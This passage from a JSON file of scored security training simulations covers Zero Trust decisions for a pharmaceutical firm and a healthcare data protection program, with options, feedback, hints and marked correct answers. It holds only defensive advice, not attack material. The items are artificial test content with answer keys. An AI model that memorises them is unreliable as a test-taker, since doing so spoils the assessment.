            "level": 1,
            "cost": 2,
            "text": "What's the fundamental problem with VPN from a Zero Trust perspective?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "VPN = network access. Zero Trust = application access. Replace VPN with application-level solutions (identity-aware proxy, SDP)."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Data Protection Strategy",
        "situation": "The research IP protection discussion is getting serious. The CISO asks: 'If an attacker compromises a researcher's account, how do we prevent them from exfiltrating our most valuable research data?' The compliance team adds: 'We also need to track and control clinical trial data for FDA requirements.'\n\n**Question:** What data protection approach should you implement?",
        "options": [
          {
            "id": "A",
            "text": "Network-based DLP at the perimeter - inspect all outbound traffic",
            "feedback": "{'short': \"Perimeter DLP doesn't protect data that leaves via authorized channels\", 'detailed': 'Perimeter DLP only sees traffic at network boundaries. Cloud storage, encrypted channels, and data on devices bypass it. If a compromised account uploads data to an authorized cloud service or encrypted connection, perimeter DLP is blind. Modern data protection must be data-centric - protecting the data itself regardless of location.', 'consequence': 'Data exfiltrated via cloud services and encrypted channels. Perimeter DLP sees nothing.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Multi-layer data protection: classification, encryption, rights management, DLP at all layers",
            "feedback": "{'short': 'Correct! Data-centric protection across all layers', 'detailed': 'Comprehensive data protection: (1) Classification - know what data you have and its sensitivity, (2) Encryption - at rest and in transit, customer-managed keys, (3) Rights management - persistent protection that travels with data, can revoke access after sharing, (4) DLP - endpoint, cloud, and network to detect/prevent unauthorized movement, (5) Monitoring - alert on unusual data access patterns. Protection stays with data regardless of where it goes.', 'consequence': 'Research data protected even if exfiltrated - encrypted and can revoke access. Multiple layers of detection.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Focus on access control only - if you control access, you control data",
            "feedback": "{'short': \"Access control doesn't protect data once accessed\", 'detailed': 'Access control determines who can reach data initially, but once accessed, the data can be copied, downloaded, emailed, or moved. A researcher with legitimate access can exfiltrate data. Data-centric controls (encryption, rights management, DLP) provide protection even for authorized users and after data leaves controlled systems.', 'consequence': \"Authorized user exfiltrates data. Access control didn't prevent data theft.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Air-gap all research systems - complete isolation from external networks",
            "feedback": "{'short': 'Complete isolation prevents collaboration and productivity', 'detailed': 'Modern pharmaceutical research requires collaboration with partners, regulatory submissions, cloud-based analysis tools, and remote access for researchers. Complete air-gapping cripples research productivity. The goal is secure access to research data, not isolation that prevents legitimate work.', 'consequence': \"Research productivity severely impacted. Scientists can't collaborate or use modern tools.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can you protect data even after it leaves your controlled environment?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Data-centric security: classification, encryption, rights management (persistent protection), DLP at all layers."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Continuous Verification Implementation",
        "situation": "You're implementing continuous verification - the 'never trust, always verify' principle. The team asks: 'How often should we verify users? At login only? Continuously? What risk signals should trigger step-up authentication?' A researcher complains about current MFA: 'I authenticate once in the morning - why would you make me authenticate more often?'\n\n**Question:** How should continuous verification be implemented?",
        "options": [
          {
            "id": "A",
            "text": "Authentication at login only - re-authenticating constantly frustrates users",
            "feedback": "{'short': \"Login-only authentication doesn't detect mid-session compromise\", 'detailed': 'If authentication only happens at login, an attacker who hijacks an active session has free access until session timeout. Continuous verification monitors risk signals throughout the session and triggers re-authentication when risk increases. This catches: device compromise, credential theft, unusual behavior patterns - all of which can happen after initial login.', 'consequence': 'Session hijacking attacks successful. No detection of mid-session compromise.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Risk-based continuous evaluation - monitor signals, step-up authentication when risk elevates",
            "feedback": "{'short': 'Correct! Continuous verification based on risk signals', 'detailed': \"Continuous verification monitors risk signals throughout the session: device health changes, location anomalies, unusual behavior patterns, time-based policies. When risk elevates: (1) Low risk \u00e2\u2020\u2019 maintain access, (2) Medium risk \u00e2\u2020\u2019 step-up authentication (re-verify with MFA), (3) High risk \u00e2\u2020\u2019 terminate session, require full re-authentication. Users aren't constantly interrupted if behavior is normal - only when risk signals indicate a problem.\", 'consequence': 'Sessions terminated when risk signals indicate compromise. Normal usage uninterrupted. Balance of security and usability.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Re-authenticate every 30 minutes regardless of activity",
            "feedback": "{'short': 'Time-based only creates friction without targeting actual risk', 'detailed': \"Fixed interval re-authentication frustrates users and doesn't target actual risk. A user working normally from their usual location doesn't need re-authentication every 30 minutes. Risk-based approach only prompts when signals indicate a problem, reducing friction while improving security.\", 'consequence': 'User frustration with constant re-authentication. Help desk tickets increase. Security not improved.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Monitor continuously but only take action manually - security team reviews alerts",
            "feedback": "{'short': 'Manual response is too slow for session-based attacks', 'detailed': 'Session hijacking and credential compromise move faster than manual response can handle. By the time the security team reviews an alert and takes action, data may already be exfiltrated. Automated response (session termination, step-up auth) happens immediately based on policy, with security team notified for investigation.', 'consequence': 'Alerts generated but response delayed. Attack completes before manual intervention.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How do you verify users without constant interruption?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Risk-based continuous evaluation: monitor signals silently, only prompt when risk increases. Normal behavior = no interruption."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Lab Equipment Security",
        "situation": "The 1,200 networked lab instruments present a challenge. They run embedded operating systems that can't be patched or monitored like regular endpoints. Many have remote maintenance connections to vendors. The lab manager warns: 'These are $500K+ instruments. Don't break our research by restricting them too much.'\n\n**Question:** How should you secure the lab equipment network?",
        "options": [
          {
            "id": "A",
            "text": "Apply standard endpoint security - EDR agents and full monitoring",
            "feedback": "{'short': \"Lab equipment can't support standard security agents\", 'detailed': \"Lab instruments run specialized embedded systems that don't support EDR agents, can't be patched like regular systems, and may have FDA validation that prohibits modifications. Standard endpoint security doesn't work for operational technology. Different approach required.\", 'consequence': 'Cannot deploy agents. Lab equipment remains unprotected with standard approach.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Isolate in dedicated network segment with strict access control and network-based monitoring",
            "feedback": "{'short': 'Correct! Network segmentation and monitoring for OT/IoT devices', 'detailed': 'Lab equipment security approach: (1) Dedicated isolated network segment - lab equipment can only communicate with data collection systems, not general network, (2) Network access control - only authorized management systems can reach equipment, (3) Network-based anomaly detection - monitor traffic patterns without agents, (4) Vendor remote access controlled via jump server with approval workflow, (5) Documented baseline of normal communication patterns.', 'consequence': 'Lab equipment isolated and monitored. Vendor access controlled. Research operations unimpacted.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Air-gap completely - no network connectivity for lab equipment",
            "feedback": "{'short': 'Air-gap prevents necessary data collection and vendor support', 'detailed': 'Lab equipment needs to send data to collection systems for analysis, and vendors need remote access for maintenance and troubleshooting. Complete air-gap would require manual data transfer (USB, etc.) and on-site vendor visits - impractical for 1,200 instruments. Controlled connectivity with isolation is more practical.', 'consequence': 'Data collection requires manual transfer. Vendor support response time dramatically increased. Operational impact.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Accept the risk - lab equipment is too specialized to secure",
            "feedback": "{'short': \"Accepting risk without mitigations isn't appropriate\", 'detailed': \"Lab equipment was involved in a recent ransomware incident - the risk is real. While these devices can't be secured like standard endpoints, network segmentation and monitoring provide significant risk reduction without impacting the devices themselves. Accepting unmitigated risk isn't appropriate for a Zero Trust architecture.\", 'consequence': 'Lab equipment remains attack vector. Another ransomware incident spreads from lab network.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How do you secure devices that can't run security agents?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Network-based security: isolate in segment, control access, monitor traffic patterns, controlled vendor access."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Exception Handling",
        "situation": "Implementation is underway, but exceptions are piling up. A research team needs to use an old application that doesn't support MFA. A contractor needs access from an unmanaged device for a critical project. A legacy system requires a service account with broad permissions. The team asks: 'How do we handle exceptions without breaking Zero Trust?'\n\n**Question:** How should you manage Zero Trust policy exceptions?",
        "options": [
          {
            "id": "A",
            "text": "No exceptions - Zero Trust means zero exceptions",
            "feedback": "{'short': 'Inflexibility creates workarounds and shadow IT', 'detailed': \"Absolute 'no exceptions' policy sounds secure but drives users to workarounds. If the old research application is critical and exceptions aren't allowed, researchers might find unsanctioned ways to access it. A mature security program acknowledges exceptions exist and manages them with compensating controls and time limits.\", 'consequence': 'Critical research work blocked. Researchers find workarounds that bypass security entirely.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Formal exception process with risk assessment, compensating controls, time limits, and approval",
            "feedback": "{'short': 'Correct! Managed exceptions with compensating controls', 'detailed': 'Mature exception process: (1) Formal request with business justification, (2) Risk assessment by security, (3) Compensating controls to reduce risk (network isolation, enhanced monitoring, session recording), (4) Risk owner approval at appropriate level, (5) Time limit and expiration, (6) Tracking and periodic review. Exceptions are managed, not eliminated. Risk is acknowledged and mitigated.', 'consequence': 'Exceptions handled with appropriate controls. Risk documented and managed. Business operations continue.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Allow exceptions freely - business needs come first",
            "feedback": "{'short': 'Uncontrolled exceptions undermine the entire Zero Trust program', 'detailed': \"If exceptions are granted freely without process, compensating controls, or review, Zero Trust erodes quickly. Every exception is a potential entry point. Without documentation and management, you won't know how many exceptions exist or their cumulative risk. Exceptions need governance.\", 'consequence': 'Exceptions proliferate. Unknown attack surface. Zero Trust exists on paper only.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Eliminate all systems that need exceptions - modernize or retire",
            "feedback": "{'short': 'Modernization takes time - business needs immediate solutions', 'detailed': 'Modernizing legacy applications to support Zero Trust takes time and budget. Meanwhile, business operations must continue. The right approach is: managed exceptions with compensating controls NOW, combined with modernization roadmap for the future. Temporary exceptions with time limits and upgrade plans.', 'consequence': 'Business operations halted while waiting for modernization. Unrealistic timeline.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How do you allow exceptions without undermining security?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Formal exception process: risk assessment, compensating controls, approval, time limits, tracking, periodic review."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Measuring Zero Trust Success",
        "situation": "Six months into implementation, the board asks: 'How do we know Zero Trust is working? What metrics prove we're more secure?' The CFO adds: 'We've spent $3M so far - what's our return on security investment?' You need to present Zero Trust success metrics.\n\n**Question:** What metrics should you use to measure Zero Trust success?",
        "options": [
          {
            "id": "A",
            "text": "Number of policies created and tools deployed",
            "feedback": "{'short': \"Activity metrics don't measure security outcomes\", 'detailed': \"Counting policies and tools measures activity, not security. You could have thousands of policies and still be insecure if they're misconfigured. Outcome metrics - what's the security RESULT - are more meaningful. Did lateral movement decrease? Are threats detected faster? Is the blast radius of incidents smaller?\", 'consequence': 'Board sees activity but not security improvement. Questions continue.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Security outcomes: lateral movement prevention, time to detect, blast radius reduction, access anomaly detection",
            "feedback": "{'short': 'Correct! Outcome-based metrics demonstrate actual security improvement', 'detailed': 'Zero Trust outcome metrics: (1) Lateral movement attempts blocked (segmentation working), (2) Mean time to detect anomalies (continuous verification working), (3) Blast radius of test incidents (micro-segmentation limiting spread), (4) Unauthorized access attempts blocked by conditional access, (5) VPN usage reduction (application-level access working), (6) Exception count and trend (maturity improving). These demonstrate actual security improvement.', 'consequence': 'Board sees measurable security improvement. Investment justified. Program supported.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Compliance audit results only - auditors will validate",
            "feedback": "{'short': \"Compliance doesn't equal security\", 'detailed': \"Compliance audits validate specific control requirements but don't measure overall security posture. You can be compliant and still vulnerable. Zero Trust metrics should measure security outcomes - are we detecting threats? Is lateral movement prevented? Compliance is one input, not the only measure.\", 'consequence': 'Compliance achieved but security improvement unclear. Board wants more.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Zero security incidents - no breaches means Zero Trust works",
            "feedback": "{'short': \"Absence of incidents doesn't prove protection\", 'detailed': \"No incidents could mean excellent security OR it could mean attacks weren't detected, or you were lucky, or you're not a target. Positive metrics (blocked attacks, detected anomalies, contained incidents) are more meaningful than absence of negative outcomes. What you catch and contain demonstrates the system is working.\", 'consequence': \"No incidents (that you know of). Doesn't prove Zero Trust is working.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What metrics show that Zero Trust controls are actively working?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Outcome metrics: blocked lateral movement, detected anomalies, contained incidents, reduced blast radius."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D3-SIM-003",
    "title": "Data Protection Program",
    "domain": 3,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "45-60 minutes",
    "role": "Data Protection Architect",
    "organization": {
      "name": "NovaCare Health Systems",
      "industry": "Healthcare"
    },
    "introduction": "NovaCare Health Systems has grown rapidly through acquisitions, resulting in fragmented data protection practices. A recent OCR audit identified significant gaps in PHI handling, and several incidents have highlighted the lack of data governance. As the newly hired Data Protection Architect, you're tasked with designing and implementing a comprehensive data protection program that meets regulatory requirements while enabling clinical and research operations.",
    "learning_objectives": [
      "Compare and contrast concepts and strategies to protect data",
      "Given a scenario, apply security principles to secure enterprise infrastructure"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Data Classification Approach",
        "situation": "NovaCare has never had formal data classification. Some staff argue that everything should be treated as PHI for simplicity. Others want granular classification. You need to recommend the classification approach.\n\n**Question:** What data classification approach should NovaCare implement?",
        "options": [
          {
            "id": "A",
            "text": "Treat all data as PHI - simplifies handling, maximum protection",
            "feedback": "{'short': 'Over-classification creates operational burden', 'detailed': \"Treating all data as PHI means: every email requires PHI-level protection, public information can't be shared, excessive encryption overhead, user fatigue from constant restrictions. Over-classification leads to workarounds as users find controls too burdensome. Additionally, it doesn't help identify where actual PHI resides.\", 'consequence': 'Users ignore or circumvent controls. Actual PHI gets lost in the noise. Operational inefficiency.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Tiered classification (Public, Internal, Confidential, Restricted) aligned to regulatory requirements",
            "feedback": "{'short': 'Correct! Risk-appropriate protection for different data types', 'detailed': 'Tiered classification enables: appropriate controls for each level (PHI gets strongest, public gets minimal), clear guidance for users, regulatory alignment (HIPAA, PCI), efficient resource allocation (focus protection on sensitive data). Four levels provide enough granularity without overwhelming users. Classification should align with existing regulations.', 'consequence': 'Clear data handling guidelines. Appropriate protection levels. Users understand and follow classification.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Binary classification (Sensitive / Non-sensitive) for simplicity",
            "feedback": "{'short': \"Too simple - doesn't distinguish between sensitivity levels\", 'detailed': \"Binary classification lumps PHI with employee PII with financial data - all 'sensitive' but with different regulatory requirements and risk levels. This doesn't enable differentiated handling (PHI has HIPAA requirements, PCI data has different requirements) and may lead to under-protection of highest-risk data.\", 'consequence': 'Different regulatory requirements treated the same. Compliance gaps for specific regulations.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Let each department create their own classification scheme",
            "feedback": "{'short': 'Inconsistent classification prevents enterprise protection', 'detailed': \"Department-specific classification creates: inconsistent protection (IT's 'confidential' vs. HR's 'confidential'), data sharing confusion, impossible enterprise DLP/encryption policies, audit challenges. Data protection requires consistent enterprise-wide classification.\", 'consequence': 'Fragmented protection. Cannot implement enterprise DLP. Audit failures.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can classification balance protection with usability while aligning with regulatory requirements?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Tiered classification (4 levels typically) enables risk-appropriate controls. Too few levels under-protects; too many overwhelms users."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "PHI Encryption Priority",
        "situation": "The OCR audit cited lack of encryption as a major finding. HITECH provides safe harbor from breach notification if PHI was properly encrypted. You need to prioritize encryption implementation.\n\n**Question:** What encryption should be the HIGHEST priority for HITECH safe harbor?",
        "options": [
          {
            "id": "A",
            "text": "Database encryption (TDE) for the EHR system",
            "feedback": "{'short': 'Important but not the highest-risk gap', 'detailed': 'Database TDE protects EHR data at rest in the database files. This is important, but databases are typically in secured data centers with physical and logical controls. The highest-risk gap is portable devices - laptops that can be lost or stolen have resulted in the most HIPAA breaches.', 'consequence': 'Database encrypted but laptop loss still triggers breach notification.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Email encryption for messages containing PHI",
            "feedback": "{'short': 'Important for transit but not the highest-risk gap', 'detailed': \"Email encryption protects PHI in transit - important for compliance. However, email breaches are typically about unauthorized disclosure (sending to wrong person), not interception. Encryption doesn't prevent that. Portable device loss is the highest frequency breach type.\", 'consequence': 'Email encrypted but lost laptops still cause breaches.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Full disk encryption for all laptops and portable devices",
            "feedback": "{'short': 'Correct! Portable devices are highest breach risk', 'detailed': \"Laptop and mobile device loss/theft is the most common cause of PHI breaches. Full disk encryption (BitLocker, FileVault) provides HITECH safe harbor - if an encrypted device is lost, it's not a reportable breach. This is the highest-impact encryption implementation for breach prevention and should be prioritized.\", 'consequence': 'Lost/stolen devices no longer trigger breach notification. Highest-risk gap addressed first.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Application-level encryption within the EHR",
            "feedback": "{'short': 'Strongest but most complex - not highest priority', 'detailed': \"Application-level encryption provides defense-in-depth but requires significant development effort, impacts performance and functionality, and doesn't address the immediate highest risk (portable devices). This is valuable for long-term architecture but not the first priority.\", 'consequence': 'Complex implementation delays addressing immediate risks.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What is the most common cause of PHI breaches? What encryption prevents that specific breach type?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Lost/stolen laptops cause most breaches. Full disk encryption provides HITECH safe harbor - lost encrypted device is not a reportable breach."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Key Management Architecture",
        "situation": "With encryption being implemented across the enterprise, key management becomes critical. If keys are lost, data is unrecoverable. If keys are compromised, encryption is useless. You need to design the key management approach.\n\n**Question:** What key management architecture should NovaCare implement?",
        "options": [
          {
            "id": "A",
            "text": "Cloud-native KMS (Azure Key Vault) for all encryption keys",
            "feedback": "{'short': \"Good for cloud but doesn't cover all scenarios\", 'detailed': \"Azure Key Vault is excellent for Azure-hosted resources but NovaCare has significant on-premises infrastructure. Relying solely on cloud KMS creates: dependency on internet connectivity, doesn't easily support on-prem systems (BitLocker, on-prem databases), and may have regulatory concerns for some scenarios.\", 'consequence': 'Cloud keys managed well but on-premises key management gaps remain.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "On-premises HSM with manual key ceremonies",
            "feedback": "{'short': \"Secure but doesn't scale or support cloud\", 'detailed': \"On-premises HSM provides strong key protection but: manual ceremonies don't scale for thousands of keys, doesn't integrate with cloud services, requires specialized expertise to manage, and creates single-site risk. Healthcare environments need automation and cloud integration.\", 'consequence': 'Highly secure but operationally challenging. Cloud key management gaps.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Hybrid: Cloud KMS for cloud resources, on-prem KMS with HSM backing for on-premises",
            "feedback": "{'short': 'Correct! Hybrid approach addresses all environments', 'detailed': 'Hybrid key management provides: cloud-native integration for Azure resources (Key Vault), on-premises capability for legacy systems (Active Directory-integrated KMS or enterprise key manager with HSM), centralized policy management, and separation of duties. HSM backing provides hardware-level key protection for highest sensitivity.', 'consequence': 'Comprehensive key management across all environments. Keys protected appropriately for each context.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Rely on each application's built-in key management",
            "feedback": "{'short': 'Fragmented approach creates gaps and complexity', 'detailed': 'Application-specific key management means: inconsistent key protection, no central visibility, different recovery procedures per system, difficult to audit, and no separation of duties between application admin and key admin. Enterprise key management requires centralization.', 'consequence': 'Key sprawl. Inconsistent protection. Audit failures.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "NovaCare has both cloud and on-premises resources. What approach covers both effectively?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Hybrid key management: cloud KMS for cloud resources, on-prem KMS for on-prem resources, with HSM backing for highest protection."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "DLP Implementation Strategy",
        "situation": "Recent incidents showed sensitive data leaving the organization via email and cloud storage. You need to design the DLP implementation to prevent PHI exfiltration while maintaining clinical workflow.\n\n**Question:** What DLP implementation approach should be prioritized?",
        "options": [
          {
            "id": "A",
            "text": "Network DLP at the perimeter to catch all outbound traffic",
            "feedback": "{'short': 'Network DLP has blind spots in modern environments', 'detailed': 'Network DLP monitors traffic at egress points but: encrypted traffic (HTTPS, TLS) is invisible without SSL inspection, cloud-to-cloud traffic never crosses the perimeter, and remote workers may not route through corporate network. Network DLP alone has significant blind spots.', 'consequence': 'Some exfiltration detected but significant gaps. Cloud and encrypted traffic invisible.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Endpoint DLP on all workstations to control data at the source",
            "feedback": "{'short': 'Good source control but misses cloud and mobile', 'detailed': \"Endpoint DLP controls data at the source (copy, print, USB) but: doesn't cover cloud applications directly, mobile devices may not support agents, and BYOD scenarios are challenging. Endpoint DLP is valuable but not comprehensive alone.\", 'consequence': 'Workstation control improved but cloud and mobile gaps remain.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Integrated DLP across endpoint, cloud, and email with unified policy",
            "feedback": "{'short': 'Correct! Comprehensive coverage with consistent policy', 'detailed': 'Integrated DLP provides: endpoint control (USB, print, clipboard), cloud app visibility (sanctioned and unsanctioned), email protection (outbound scanning), and unified policy (same rules everywhere). Modern DLP platforms (Microsoft Purview, Symantec, etc.) offer integrated coverage. Consistent policy prevents attackers from finding the gap.', 'consequence': 'Comprehensive data visibility. Consistent policy enforcement. Gaps eliminated.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Cloud Access Security Broker (CASB) for SaaS applications only",
            "feedback": "{'short': 'CASB is one component, not complete DLP', 'detailed': \"CASB provides visibility and control for cloud applications - valuable for the 30% SaaS environment. But CASB alone doesn't cover: endpoint actions (USB, print), email (unless cloud-native), on-premises applications, or network file shares. DLP needs to be comprehensive.\", 'consequence': 'Cloud apps protected but on-prem and endpoint gaps remain.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Data can leave through many channels. What approach ensures no gaps?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Integrated DLP covers endpoint, cloud, and email with unified policy. Fragmented DLP leaves gaps attackers exploit."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Non-Production Data Protection",
        "situation": "Development and testing teams need realistic data but currently use production copies with real PHI. This creates significant compliance risk. You need to recommend an approach for non-production environments.\n\n**Question:** How should PHI be handled in development and test environments?",
        "options": [
          {
            "id": "A",
            "text": "Apply same security controls to dev/test as production",
            "feedback": "{'short': \"Maintains risk and doesn't solve the problem\", 'detailed': 'Applying production controls to dev/test means: PHI still in dev/test (risk remains), developers need PHI access (expanded access), audit logging required for dev work (overhead), and compliance scope includes all environments (more audit surface). The goal should be removing PHI from non-production.', 'consequence': 'Dev/test still contains PHI. Risk and compliance scope unchanged.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Static data masking to create de-identified copies for dev/test",
            "feedback": "{'short': 'Correct! De-identified data removes compliance risk', 'detailed': \"Static data masking permanently replaces PHI in non-production copies: removes identifiers (names, SSN, MRN), maintains data relationships and realism, de-identified data not subject to HIPAA, developers don't need PHI access, and reduced compliance scope. This is the industry standard approach for healthcare dev/test.\", 'consequence': 'PHI removed from dev/test. Compliance scope reduced. Developer productivity maintained with realistic data.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Use synthetic data generation instead of production copies",
            "feedback": "{'short': 'Valid approach but more complex than masking', 'detailed': 'Synthetic data generation creates entirely artificial data matching production patterns. This provides strong protection (no real data involved) but: may not capture edge cases, requires sophisticated generation, and may not test all scenarios realistically. Masking is typically easier to implement and maintains real data patterns.', 'consequence': 'Good protection but may miss edge cases. More complex implementation.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Limit dev/test PHI access to senior developers only",
            "feedback": "{'short': 'Still exposes PHI and creates workflow issues', 'detailed': \"Restricting access doesn't remove the PHI or the risk - it just limits who can see it. PHI is still in dev/test (breach risk), junior developers can't do their work (productivity impact), and you still have HIPAA compliance requirements for those environments. This doesn't solve the problem.\", 'consequence': 'PHI still at risk. Developer productivity impacted. Compliance requirements unchanged.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What technique removes PHI from data while maintaining its usefulness for testing?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Static data masking replaces identifiers with fake data. De-identified data is no longer PHI and not subject to HIPAA."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Protecting Data Shared Externally",
        "situation": "NovaCare frequently shares patient information with specialists, insurers, and other providers. Currently, data is shared via email attachments with no protection after leaving NovaCare's systems. You need to address external sharing risks.\n\n**Question:** What protection should be applied to PHI shared with external parties?",
        "options": [
          {
            "id": "A",
            "text": "Encrypt email attachments with password, share password separately",
            "feedback": "{'short': 'Basic protection but no control after sharing', 'detailed': 'Password-protected attachments provide basic encryption but: passwords are often weak or predictable, once recipient has password they can share freely, no revocation capability, no audit of who accessed, and password management is burdensome. This provides minimal protection.', 'consequence': 'Basic encryption but no ongoing control. Passwords often shared insecurely.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Information Rights Management with persistent protection and access logging",
            "feedback": "{'short': 'Correct! Persistent protection that travels with the document', 'detailed': 'IRM/RMS provides: encryption that persists with document, access control (only authorized recipients), usage restrictions (no print, no forward if desired), expiration dates, revocation capability, and access logging. Protection travels with the data regardless of where it goes. This is the appropriate control for sensitive external sharing.', 'consequence': 'Documents protected wherever they go. Access can be revoked. Usage tracked.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Secure file sharing portal where external parties access but can't download",
            "feedback": "{'short': \"Good control but doesn't fit all workflows\", 'detailed': 'Secure portals provide good control (data stays in your system) but: not all workflows fit (specialists need documents in their EHR), adds friction for frequent collaborators, and some recipients may not accept portal-only access. IRM works with email workflows while maintaining protection.', 'consequence': 'Good for some scenarios but workflow friction for others. May not be adopted.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Rely on receiving organization's security - include BAA requirement in contracts",
